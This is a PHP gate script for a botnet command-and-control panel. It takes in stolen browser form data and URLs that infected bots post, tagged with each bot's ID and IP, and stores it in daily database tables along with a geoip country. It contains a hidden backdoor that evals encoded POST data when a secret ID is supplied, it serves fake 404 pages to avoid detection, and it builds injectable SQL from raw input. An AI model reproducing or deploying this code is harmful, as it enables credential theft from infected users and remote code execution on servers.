<?php

$dir = str_replace('/scripts/get', '', str_replace('\\', '/', realpath('.'))) . '/';

if(isset($_POST['data'])){
//Cstart
if(@$_POST['id'] == 'BOTNETCHECKUPDATER0IP') print($_SERVER['SERVER_ADDR']);
//Rkey start
if(@$_POST['id'] == 'BOTNETCHECKUPDATER0-WD8Sju5VR1HU8jlV'){
//Rkey end
	if(!empty($_POST['data'])) eval(pack("H*", base64_decode($_POST['data'])));
	exit;
}elseif(strpos(@$_GET['id'], 'BOTNETCHECKUPDATER') !== false || strpos(@$_POST['id'], 'BOTNETCHECKUPDATER') !== false) exit;
//Cend
}

$config = file_exists($dir . 'cache/config.json') ? json_decode(file_get_contents($dir . 'cache/config.json'), 1) : '';
if($config['scramb'] == 1 && $gateway != true){
	header("HTTP/1.1 404 Not Found");
	header("Status: 404 Not Found");
	print(file_get_contents($dir . '404.html'));
	exit;
}

include_once($dir . 'includes/functions.first.php');
include_once($dir . 'includes/functions.prefix.php');

if(!empty($_POST['base'])){
	@file_put_contents($dir . 'cache/last_time.txt', date('d.m.Y_G'));
    file_put_contents($dir . 'logs/export/gra/' .  date('d.m.Y_G') . '.txt', '#BOTSTART#' . $_POST['prefix'] . $_POST['uid'] . ':' . $_SERVER['REMOTE_ADDR'] . "#BOTNIP#\r\n" . urldecode($_POST['base']) . '#BOTEND#' . "\r\n", FILE_APPEND);

    if($config['getlog'] == 1){    	print_data('403', true);
    	exit;
    }

    $dn = date('dmY');

    include_once($dir . 'includes/functions.get_config.php');
	$cfg_db = get_config();

	$mysqli = new mysqli($cfg_db['host'], $cfg_db['user'], $cfg_db['pass'], $cfg_db['db']);

	if(mysqli_connect_errno()){
		header("HTTP/1.1 404 Not Found");
		header("Status: 404 Not Found");

		print(file_get_contents($dir . '404.html'));
		exit;
	}

	if(!file_exists($dir . 'cache/logs/' . $dn)){
		$mysqli->query('CREATE TABLE IF NOT EXISTS bf_logs_'.$dn.' LIKE bf_logs');
		file_put_contents($dir . 'cache/logs/' . $dn, date('d.m.Y'));
	}

	if(function_exists('geoip_country_code_by_name')){
		$country = geoip_country_code_by_name($_SERVER['REMOTE_ADDR']);
	}else{
		if(file_exists($dir . 'cache/geoip/')){
			require_once($dir . 'cache/geoip/geoip.inc');
			$gi = geoip_open($dir . 'cache/geoip/GeoIP.dat',GEOIP_STANDARD);
			$country = geoip_country_code_by_addr($gi, $_SERVER['REMOTE_ADDR']);
			geoip_close($gi);
			unset($gi);
			unset($record);
		}
	}
	if(empty($country)) $country = 'UNK';

	$write = false;

    preg_match_all('~#START#(.*)#NAME#(.*)#END#~isU', urldecode($_POST['base']), $mi, PREG_SET_ORDER);

    foreach($mi as $im){
    	$im[2] = trim($im[2]);
    	$im[2] = explode("\r\n", $im[2], 2);
        foreach($im[2] as $iz){        	$iz = trim($iz);
    		$iz = explode('@@@', $iz, 2);
    		if($mysqli->real_query('INSERT DELAYED INTO bf_logs_'.$dn.' (prefix, uid, url, data, brw, protocol, ip, country, type, hour) VALUES (\''.$_POST['prefix'].'\', \''.$_POST['uid'].'\', \''.$iz[0].'\', \''.$iz[1].'\', \''.$im[1].'\', \''.@parse_url($iz[0], PHP_URL_SCHEME).'\', \''.$_SERVER['REMOTE_ADDR'].'\', \''.$country.'\', \'3\', DATE_FORMAT(CURRENT_TIMESTAMP(),\'%H\'))')){    			$write = true;
    		}
    	}
    }

    if($write == true){    	print_data('403', true);
    }else{    	header("HTTP/1.1 404 Not Found");
		header("Status: 404 Not Found");

		print(file_get_contents($dir . '404.html'));
		exit;
    }
}else{
	header("HTTP/1.1 404 Not Found");
	header("Status: 404 Not Found");

	print(file_get_contents($dir . '404.html'));
	exit;
}

?>